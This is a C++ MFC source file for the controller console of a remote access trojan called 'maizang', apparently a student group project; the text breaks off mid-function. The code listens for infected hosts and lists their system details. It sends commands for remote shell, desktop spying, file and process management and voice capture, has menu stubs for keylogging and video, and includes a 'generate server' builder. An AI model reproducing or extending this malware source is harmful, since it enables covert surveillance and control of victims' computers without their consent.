// maizangDlg.cpp : implementation file
//

#include "stdafx.h"
#include "maizang.h"
#include "maizangDlg.h"
#include <process.h>
#include "WindowManagerDlg.h"
#include "VoiceManage.h"

#ifndef _HEAD_COMMAND_H
#define _HEAD_COMMAND_H
#include  "Command.h" 
#endif

#include "ScreenDlg.h"
#include "CmdDlg.h"
#include "Process.h"
#include "SettingDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About
typedef struct 
{
	char *title;
	int nWidth;
}COLUMNSTRUCT;  //自定义一个结构体 保存列表的每个项的名字以及显示宽度

COLUMNSTRUCT g_Column_Online[]=
{
	{"IP",             140},
	{"区域",           140},
	{"计算机名/备注",  140},
	{"操作系统",       140},
	{"CPU",            140 },
	{"摄像头",         140 },
	{"内存",           140 }
};
int g_Column_Online_Count=7;//列表项的个数
int g_Column_Online_Sumsize=0;//记录列表的总长度
COLUMNSTRUCT g_Column_Message[]=
{
	{"信息类型",     200},
	{"时间",         200},
	{"信息内容",     600}
};
int g_Column_Message_Count=3;//列表项的个数
int g_Column_Message_Sumsize=0;//记录列表的总长度
class CAboutDlg : public CDialog
{	
public:
	CAboutDlg();
	
	// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA
	
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL
	
	// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
public:
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
//{{AFX_MSG_MAP(CAboutDlg)
// No message handlers
//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMaizangDlg dialog

CMaizangDlg::CMaizangDlg(CWnd* pParent /*=NULL*/)
: CDialog(CMaizangDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMaizangDlg)
	// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	Online_computer_count=0;//上线主机数量初始为0
	m_ListenPort=8000;
	m_ChoseSocket    = INVALID_SOCKET;
	m_CurrIndex   = -1;
}

void CMaizangDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMaizangDlg)
	DDX_Control(pDX, IDC_Online, m_List_Online);
	DDX_Control(pDX, IDC_Message, m_List_Message);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMaizangDlg, CDialog)
//{{AFX_MSG_MAP(CMaizangDlg)
ON_WM_SYSCOMMAND()
ON_WM_PAINT()
ON_WM_QUERYDRAGICON()
ON_WM_SIZE()
//ON_WM_CANCELMODE()
ON_NOTIFY(NM_RCLICK, IDC_Online, OnRclickOnline)
ON_COMMAND(IDM_ONLINE_DELETE, OnOnlineDelete)
ON_COMMAND(IDM_MAIN_CLOSE, OnMainClose)
ON_COMMAND(IDM_MAIN_ABOUT, OnMainAbout)
ON_COMMAND(IDM_ONLINE_AUDIO, OnOnlineAudio)
ON_COMMAND(IDM_MAIN_BUILD, OnCreateServer)
ON_COMMAND(IDM_ONLINE_CMD, OnOnlineCmd)
ON_COMMAND(IDM_ONLINE_DESKTOP, OnOnlineDesktop)
ON_COMMAND(IDM_ONLINE_FLIE, OnOnlineFlie)
ON_COMMAND(IDM_ONLINE_PROCESS, OnOnlineProcess)
ON_COMMAND(IDM_ONLINE_REGISTRY, OnOnlineRegistry)
ON_COMMAND(IDM_ONLINE_SERVER, OnOnlineServer)
ON_COMMAND(IDM_ONLINE_VIDIO, OnOnlineVidio)
ON_COMMAND(IDM_ONLINE_WINDOW, OnOnlineWindow)
//}}AFX_MSG_MAP
ON_MESSAGE(WM_FILEDLGSHOW, OnFileDlgShow)
ON_MESSAGE(WM_SCREENDLGSHOW, OnScreenDlgShow)
ON_MESSAGE(WM_CMD_DLG_SHOW, OnCmdDlgShow)
ON_MESSAGE(WM_PROCESS_SHOW, OnProcessShow)
ON_MESSAGE(WM_WINDOW_MANAGER_DLG_SHOW, OnWindowManagerDlgShow)
ON_COMMAND(IDM_ONLINE_KEYBOARD, &CMaizangDlg::OnOnlineKeyboard)
ON_COMMAND(IDM_ONLINE_CLASSROOM, &CMaizangDlg::OnOnlineClassroom)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMaizangDlg message handlers

//主窗口的初始化
BOOL CMaizangDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	
	// Add "About..." menu item to system menu.
	
	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
	
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	
	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	
	HMENU hmenu;
	hmenu=LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));//载入菜单资源
														/*第一个参数如果上面的是exe  写成NULL  若为dll 要写资源所在文件模块的句柄标识 第二个是资源ID
	MAKEINTRESOURCE 为类型转换*/
	::SetMenu(this->m_hWnd,hmenu);
	::DrawMenuBar(this->m_hWnd);

	//创建状态栏
	CreatStatusBar();

	//创建工具条
    CreatToolBar();

	//调整窗口大小
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=25;
	MoveWindow(rect);

	//初始化 消息列表以及上线列表信息
    InitList(); 
	ShowMessage(true,"软件初始化成功");

	 //开启监听
	StartListen(m_ListenPort);
	Sleep(500); 


	 

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMaizangDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)	
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.
//重绘
void CMaizangDlg::OnPaint() //重绘
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting
		
		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);
		
		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		
		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMaizangDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


//主界面大小改变后 其它控件的变化处理
void CMaizangDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if(m_List_Online.m_hWnd!=NULL)//随着主框架大小的改变更新上线列表的大小
	{
		CRect rc;
		rc.left=1;
		rc.top=80;
		rc.right=cx-1;
		rc.bottom=cy-160;
		m_List_Online.MoveWindow(rc);
        
        for(int i=0;i<g_Column_Online_Count;i++)
		{
			double mid=g_Column_Online[i].nWidth;
			mid/=g_Column_Online_Sumsize;
			mid*=cx;
			m_List_Online.SetColumnWidth(i,(int)mid);
		}
	}
	if(m_List_Message.m_hWnd!=NULL)//随着主框架大小的改变更新消息列表的大小
	{
		CRect rc;
		rc.left=1;
		rc.top=cy-156;
		rc.right=cx-1;
		rc.bottom=cy-26;
		m_List_Message.MoveWindow(rc);
		
		for(int i=0;i<g_Column_Message_Count;i++)
		{
			double mid=g_Column_Message[i].nWidth;
			mid/=g_Column_Online_Sumsize;
			mid*=cx;
			m_List_Message.SetColumnWidth(i,(int)mid);
		}
	}
	
	if(m_wndStatusBar.m_hWnd!=NULL)//更新状态栏大小
	{
		CRect rc;
		rc.top=cy-25;
		rc.left=0;
		rc.right=cx;
		rc.bottom=cy;
		m_wndStatusBar.MoveWindow(rc);
		//	m_wndStatusBar.SetPaneInfo(0,m_wndStatusBar.GetItemID(0),SBPS_POPOUT,cx);
		/*
		void SetPaneInfo(  设置状态条的显示状态
		int nIndex,   状态条的索引
		UINT&  nID，   状态条的字符ID
		UINT&  nStyle  状态条的样式
		int&  cxWidth  状态条的宽度
		*/
	}
	
	if(m_ToolBar.m_hWnd!=NULL)//工具条
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);
	}
	
	
	
}

 

//CListCrl（消息列表 上线列表） 列信息名称的初始化  
int CMaizangDlg::InitList()
{
	int i;
	for( i=0;i<g_Column_Online_Count;i++)
	{
		m_List_Online.InsertColumn(i,g_Column_Online[i].title,LVCFMT_CENTER,g_Column_Online[i].nWidth);
		g_Column_Online_Sumsize+=g_Column_Online[i].nWidth;
	}
	for(i=0;i<g_Column_Message_Count;i++)
	{
		m_List_Message.InsertColumn(i,g_Column_Message[i].title,LVCFMT_CENTER,g_Column_Message[i].nWidth);
		g_Column_Message_Sumsize+=g_Column_Message[i].nWidth;
	}
	ListView_SetExtendedListViewStyle(m_List_Online.m_hWnd, LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_CHECKBOXES);
	//	m_List_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_List_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	
	
	return 0;
	
}


//添加上线列表的一行小目录 起到区间分割作用的那些  添加上线主机
void CMaizangDlg::AddOnlineList(SOCKET socket, CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strMemSz)
{
	m_List_Online.InsertItem(0,strIP);//默认为0行 这样所有插入的新列都在最上面
	m_List_Online.SetItemData(0, (DWORD)socket);
	m_List_Online.SetItemText(0,ONLINELIST_ADDR,strAddr);//第一个参数同上，第二个为第二课中的枚举变量
	m_List_Online.SetItemText(0,ONLINELIST_COMPUTER_NAME,strPCName);
	m_List_Online.SetItemText(0,ONLINELIST_OS,strOS);
	m_List_Online.SetItemText(0,ONLINELIST_CPU,strCPU);
	m_List_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);
	m_List_Online.SetItemText(0,ONLINELIST_MEMORY,strMemSz);
}


//消息列表输出消息的处理
void CMaizangDlg::ShowMessage(bool bIsOk, CString strMsg)
{
	CString strIsOk,strTime;
	CTime t=CTime::GetCurrentTime();
	strTime=t.Format("%H:%M:%S");
	if(bIsOk)
		strIsOk="执行成功";
	else strIsOk="执行失败";
	m_List_Message.InsertItem(0,strIsOk);
	m_List_Message.SetItemText(0,1,strTime);
	m_List_Message.SetItemText(0,2,strMsg);
	
	
	Online_computer_count = m_List_Online.GetItemCount();
	strStatusBar.Format("当前在线主机 [%d]", Online_computer_count);
	m_wndStatusBar.SetText(strStatusBar, 0, 0); 
}


//当右击上线列表处应该起到的反应
void CMaizangDlg::OnRclickOnline(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here

	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
	 
        m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}

    CMenu popup;
	popup.LoadMenu(IDR_MENU_ONLINE);
	CMenu *pM=popup.GetSubMenu(0);
    CPoint p;
	GetCursorPos(&p);
	
	int Count=pM->GetMenuItemCount();
	if(m_List_Online.GetSelectedCount()==0)//如果没有选中上线主机，则将弹出菜单设置为不可用
	{
		for(int i=0;i<Count;i++)
		{
			pM->EnableMenuItem(i,MF_BYPOSITION|MF_DISABLED|MF_GRAYED);
		}
	}
	
	pM->TrackPopupMenu(TPM_LEFTALIGN,p.x,p.y,this);
	*pResult = 0;
}


//选中某个主机断开连接后的处理
void CMaizangDlg::OnOnlineDelete() 
{
	// TODO: Add your command handler code here
	CString  strIP="主机 ";
	int Select=m_List_Online.GetSelectionMark();//得到选中的哪一行
	strIP+=m_List_Online.GetItemText(Select,ONLINELIST_IP);
	/*GetItemText  第一个参数是哪一行  第二个是第几列 我们知道上面参数值是0*/
	m_List_Online.DeleteItem(Select);//删除选中项
	strIP+=" 已断开连接";
	ShowMessage(true,strIP);//更新日志消息
}


//菜单栏的退出功能实现
void CMaizangDlg::OnMainClose()
{
	// TODO: Add your command handler code here
	::PostMessage(this->m_hWnd,WM_CLOSE,0,0);
	/*
	BOOL PostMessage(
	HWND hWnd,      // handle of destination window
	UINT Msg,       // message to post
	WPARAM wParam,  // first message parameter
	LPARAM lParam   // second message parameter
	);
	
	*/
}


//显示主菜单中的关于对话框
void CMaizangDlg::OnMainAbout()
{
	// TODO: Add your command handler code here
	CAboutDlg aboutdlg;
	aboutdlg.DoModal();
}


static UINT indicators[]=//下面的函数需要一个数组装填字符串ID号
{
	IDS_STATUSBAR_STRING,
		IDS_ABOUTBOX
};


//状态栏的构建
void CMaizangDlg::CreatStatusBar()
{
	//create statusbar=============================
	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM,  CRect(0,0,0,0),  this,  0x1000003);
	int strPartDim[3]= {350,550,-1};
	m_wndStatusBar.SetParts(3,strPartDim);
	m_wndStatusBar.SetText("当前在线主机 [0]", 0, 0);
	//	CRect rc;
	//	::GetWindowRect(m_wndStatusBar.m_hWnd,rc);
	//	m_wndStatusBar.MoveWindow(rc);
}

//声音功能
void CMaizangDlg::OnOnlineAudio() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{

		m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
	if (m_ChoseSocket ==  INVALID_SOCKET) 
	{
		MessageBox("您还未选中任何主机");
		return;
	}
	if(m_ChoseSocket !=  INVALID_SOCKET)
	{
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_VOICE;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
		{
			VoiceManage voiceManage;
			voiceManage.VoiceTransmit();
			voiceManage.DoModal();
		}
	}

	//MessageBox("声音");
}

//远程终端
void CMaizangDlg::OnOnlineCmd() 
{
	// TODO: Add your command handler code here
//	MessageBox("远程终端");
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
        m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
 
	
	if (m_ChoseSocket ==  INVALID_SOCKET) 
	{
		MessageBox("您还未选中任何主机");
		return;
	}

 	if(m_ChoseSocket != INVALID_SOCKET)
	{
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_CMD_SHELL_REQUEST;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
		{
		     m_wndStatusBar.SetText("命令发送成功", 2, 0);
		}
		else
		{
		   m_wndStatusBar.SetText("命令发送失败", 2, 0);
		   shutdown(m_ChoseSocket, 0x02);
		   closesocket(m_ChoseSocket);
		}
		
	}



}


//生成服务端
void CMaizangDlg::OnCreateServer(){
		CSettingDlg * pSettingDlg = new CSettingDlg;
		pSettingDlg->Create(IDD_SETTING, GetDesktopWindow());//创建一个非模态对话框
	    pSettingDlg->ShowWindow(SW_SHOW);
}

//桌面监控
void CMaizangDlg::OnOnlineDesktop() 
{
	// TODO: Add your command handler code here
	//MessageBox("桌面监控");
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
        m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
 
	
	if (m_ChoseSocket ==  INVALID_SOCKET) 
	{
		MessageBox("您还未选中任何主机");
		return;
	}

 	if(m_ChoseSocket != INVALID_SOCKET)
	{
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_SCREEN_REQUEST;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
		{
		     m_wndStatusBar.SetText("命令发送成功", 2, 0);
		}
		else
		{
		   m_wndStatusBar.SetText("命令发送失败", 2, 0);
		   shutdown(m_ChoseSocket, 0x02);
		   closesocket(m_ChoseSocket);
		}
		
	}
	
}

//文件管理 
void CMaizangDlg::OnOnlineFlie()
{
	// TODO: Add your command handler code here
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
		 
        m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
 
	
	if (m_ChoseSocket ==  INVALID_SOCKET) 
	{
		MessageBox("您还未选中任何主机");
		return;
	}

 	if(m_ChoseSocket != INVALID_SOCKET)
	{
	//	CFileManage m_manage;
  
 
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_FILEMANAGE;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
		{
		 
		     m_wndStatusBar.SetText("命令发送成功", 2, 0);
		}
		else
		{
		   m_wndStatusBar.SetText("命令发送失败", 2, 0);
		   shutdown(m_ChoseSocket, 0x02);
		   closesocket(m_ChoseSocket);
		}
		
	}
	
}

//进程管理 
void CMaizangDlg::OnOnlineProcess()
{
	// TODO: Add your command handler code here
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel = m_List_Online.GetNextSelectedItem(pos);
	if (iCurrSel >= 0){
		m_ChoseSocket = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else{
		m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
	if (m_ChoseSocket == INVALID_SOCKET){
		MessageBox("你还未选中任何主机");
		return;
	}
	if (m_ChoseSocket != INVALID_SOCKET){
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_PROCESS_SHOW;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket, NULL, &m_MsgHead) == TRUE){
			m_wndStatusBar.SetText("命令发送成功", 2, 0);
		}
		else{
			m_wndStatusBar.SetText("命令发送失败", 2, 0);
			shutdown(m_ChoseSocket, 0x02);
			closesocket(m_ChoseSocket);
		}
	}

}

//注册表管理 
void CMaizangDlg::OnOnlineRegistry()
{
	// TODO: Add your command handler code here
	MessageBox("注册表管理");
}

//服务管理
void CMaizangDlg::OnOnlineServer() 
{
	// TODO: Add your command handler code here
	MessageBox("服务管理");
}

//视频管理
void CMaizangDlg::OnOnlineVidio() 
{
	// TODO: Add your command handler code here
	MessageBox("视频管理");
}

//窗口管理
void CMaizangDlg::OnOnlineWindow()
{
	// TODO: Add your command handler code here
	// TODO: Add your command handler code here
   openDlg(CMD_WINDOW_MANAGER_DLG_SHOW);
}


void CMaizangDlg :: openDlg(int cmd){
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel = m_List_Online.GetNextSelectedItem(pos);
	if (iCurrSel >= 0){
		m_ChoseSocket = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else{
		m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
	if (m_ChoseSocket == INVALID_SOCKET){
		MessageBox("你还未选中任何主机");
		return;
	}
	if (m_ChoseSocket != INVALID_SOCKET){
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = cmd;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket, NULL, &m_MsgHead) == TRUE){
			m_wndStatusBar.SetText("命令发送成功", 2, 0);
		}
		else{
			m_wndStatusBar.SetText("命令发送失败", 2, 0);
			shutdown(m_ChoseSocket, 0x02);
			closesocket(m_ChoseSocket);
		}
	}
}
//键盘监听
void CMaizangDlg::OnOnlineKeyboard()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("键盘记录");
}

//教室各种功能
void CMaizangDlg::OnOnlineClassroom()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("教室功能");
}



//创建工具条
void CMaizangDlg::CreatToolBar()
{
	if(!m_ToolBar.CreateEx(this,TBSTYLE_FLAT,WS_CHILD|WS_VISIBLE|CBRS_TOP
		|CBRS_GRIPPER|CBRS_TOOLTIPS|CBRS_FLYBY|CBRS_SIZE_DYNAMIC)||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("创建工具条失败");
		return ;
	}
	m_ToolBar.ModifyStyle(0,TBSTYLE_FLAT);
	m_ToolBar.LoadTrueColorToolBar
		(
		48,//加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);
	RECT rt,rtMain;
	GetWindowRect(&rtMain);
	rt.left=0;
	rt.top=0;
	rt.bottom=80;
	rt.right=rtMain.right-rtMain.left+10;
	m_ToolBar.MoveWindow(&rt,TRUE);
	
	m_ToolBar.SetButtonText(0,"桌面管理");
	m_ToolBar.SetButtonText(1,"视频管理");
	m_ToolBar.SetButtonText(2,"进程管理");
	m_ToolBar.SetButtonText(3,"键盘管理");
	m_ToolBar.SetButtonText(4,"语音管理");
	m_ToolBar.SetButtonText(5,"文件管理");
	m_ToolBar.SetButtonText(6,"窗口管理");
	m_ToolBar.SetButtonText(7,"终端管理");
	m_ToolBar.SetButtonText(8,"注册表管理");
	m_ToolBar.SetButtonText(9,"服务管理");
	m_ToolBar.SetButtonText(11,"版权");
	m_ToolBar.SetButtonText(12,"教室功能");
	m_ToolBar.SetButtonText(13,"生成服务端");
	m_ToolBar.SetButtonText(14,"退出");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);
}

//处理主机的上线  连接服务端  作套接字的创建等
unsigned  __stdcall  ThreadAccept(void * pParam)
{
	CMaizangDlg *This = (CMaizangDlg*)pParam;
	
	sockaddr_in LocalAddr={0};
	sockaddr_in ClientAddr={0};
	int addr_size=sizeof(sockaddr_in);
	
	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2,2),&lpWSAData);//加载套接字
	
	closesocket( This->m_ListenSock);//防止重复监听产生的错误 先关闭
    This->m_ListenSock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);//创建套接字
	
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port=htons(This->m_ListenPort);
	LocalAddr.sin_addr.s_addr=htonl(INADDR_ANY);
	
	if(bind(This->m_ListenSock, (LPSOCKADDR)&LocalAddr, addr_size) == SOCKET_ERROR)
	{
 
		CString m_listen;
		m_listen.Format("监听端口 %d 失败", This->m_ListenPort);
        This->m_wndStatusBar.SetText(m_listen, 1, 0);
		closesocket(This->m_ListenSock);
		return 0;
	}
	 
	if(listen(This->m_ListenSock, 10) == SOCKET_ERROR)
	{
		closesocket(This->m_ListenSock);	
		return 0;
	}
	 
	while (This->m_ListenSock != INVALID_SOCKET)
	{
		SOCKET  MainSocket =INVALID_SOCKET;
		MainSocket = accept(This->m_ListenSock, (LPSOCKADDR) &ClientAddr, &addr_size); //产生一个与特定客户端通信的套接字
		//其实 MainSocket 和m_ListenSock的端口是一样的
		if (MainSocket == INVALID_SOCKET)
		{
			 This->StopListen();
			 return 0;
		}
		else
		{
			unsigned dwThreadId;
			DWORD *pParam2 =new DWORD[2];//保存线程所需要的2个参数
			pParam2[0] = (DWORD)pParam;
			pParam2[1] = (DWORD)MainSocket;
			HANDLE m_hThread =
			 (HANDLE)_beginthreadex(NULL,				 
									 0,					 
									 AcceptSocket,  
									 pParam2,   //其指向2个参数所保存的地址   传递2个参数
									 0, 		 
									 &dwThreadId);
		CloseHandle(m_hThread);
		}

	}
 
	return 0;
	
	
}


//开启端口号监听  并创建线程处理主机上线 和心跳包
  void CMaizangDlg::StartListen(int Port)
	{
          m_ListenPort = Port;
	       //启动监听线程
		  	unsigned dwThreadId; 
			hAcceptThread = (HANDLE)_beginthreadex(NULL,				 
									 0,					 
									 ThreadAccept,  //调用ThreadAccept线程
									 this,   
									 0,
									 &dwThreadId);

		   //创建上线主机检测线程
			hCheckThread =
			 (HANDLE)_beginthreadex(NULL,				 
									 0,					 
									  ThreadCheck,  //调用ThreadCheck线程
									 this,   
									 0, 		 
									 &dwThreadId);
		 
          if(hAcceptThread == NULL || hCheckThread == NULL)
          {
                   StopListen();
			       return ;
          }
		  else
		  {
			CloseHandle(hAcceptThread);
			CloseHandle(hCheckThread);
			  char StrPort[100];
			  CString m_listen;
			  m_listen.Format("监听端口 %d 成功!!!", Port);
              m_wndStatusBar.SetText(m_listen, 1, 0);
			  sprintf(StrPort, "%d端口初始化成功！", m_ListenPort);
			  ShowMessage(true,StrPort);
			  //启动在线检测线程  检测是否下线
			  			hAcceptThread =(HANDLE)_beginthreadex(NULL,				 
									 0,					 
									  ThreadCheck,  
									 this,   
									 0,
									 &dwThreadId);
						CloseHandle(hAcceptThread);
			  return ;
		  }

}

  //停止监听
void CMaizangDlg::StopListen()
{
	DWORD dwExitCode;
	if(hAcceptThread != NULL)
	{
		WaitForSingleObject(hAcceptThread,100);//等待100ms
		if(GetExitCodeThread(hAcceptThread,&dwExitCode))//得到退出码
		{
			if(dwExitCode==STILL_ACTIVE)//如果退出码显示线程仍旧活跃 就关闭
			{
				TerminateThread(hAcceptThread,dwExitCode);//关闭线程
			}
		}
		CloseHandle(hAcceptThread);
		hAcceptThread = NULL;
	}

	if (hCheckThread != NULL)
	{
	     WaitForSingleObject(hCheckThread, 100);
		 if (GetExitCodeThread(hCheckThread, &dwExitCode))
		 {
			 if(dwExitCode==STILL_ACTIVE)//如果退出码显示线程仍旧活跃 就关闭
			 {
				 TerminateThread(hCheckThread, dwExitCode);//关闭线程
			 }		      
		 }
		 CloseHandle(hAcceptThread);
		hAcceptThread = NULL;
	}
}

 
//客户端对于服务端的消息的处理     小组成员接口
unsigned __stdcall  AcceptSocket(void   *pvoid)
{
	 
	 DWORD*   pParam   =   (DWORD   *)pvoid; 
	 SOCKET  socket =  (SOCKET)(pParam[1]);//传递过来的 MainSocket套接字
	 CMaizangDlg* This = (CMaizangDlg*)(pParam[0]);//传递过来的本程序窗口的this指针 
	if(socket!=INVALID_SOCKET)
	{
        //ShowMessage(true,"有主机 138.221.232.243 上线请注意");

		MsgHead msgHead;//Command中我们自己定义的消息头 用于传送命令
		char chBuffer[256];	
		if(!RecvMsg(socket,chBuffer,&msgHead))
		{
			return 0;
		}
		switch(msgHead.dwCmd)
		{
		case  SOCKET_CONNECT : 
			{
  
			SysInfo m_SysInfo;
			memcpy(&m_SysInfo, chBuffer, sizeof(SysInfo));
			CAutoLock  lock(This->cOnlineLock);//定义一个锁 保护临界资源  到本函数结束 自动释放锁 具体实现看autolock.h 很简单
			sockaddr_in addr;
	 
			int sz = sizeof(addr);
			getpeername(socket, (sockaddr *)&addr, &sz);
			
			CString OnLineIP;
			OnLineIP.Format("%s", inet_ntoa(addr.sin_addr));
 
			This->AddOnlineList(socket, OnLineIP, "", m_SysInfo.computerName, m_SysInfo.osVersion,m_SysInfo.cpuInfo, m_SysInfo.hasCamera, m_SysInfo.memorySize);// CString strCPU, CString strVideo, CString strPing);
	        CString OnlineMessage;
			OnlineMessage.Format("有主机 %s 上线请注意",OnLineIP);
            This->ShowMessage(true, OnlineMessage);
			break;
			}
		 case SOKCET_FILEMANAGE : 
			 {
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect =socket;
				 This->PostMessage(WM_FILEDLGSHOW, (DWORD)pInput, 0);//发出一个创建文件处理窗口响应消息 让OnFileDlgShow进行响应处理
				 break;
			 }
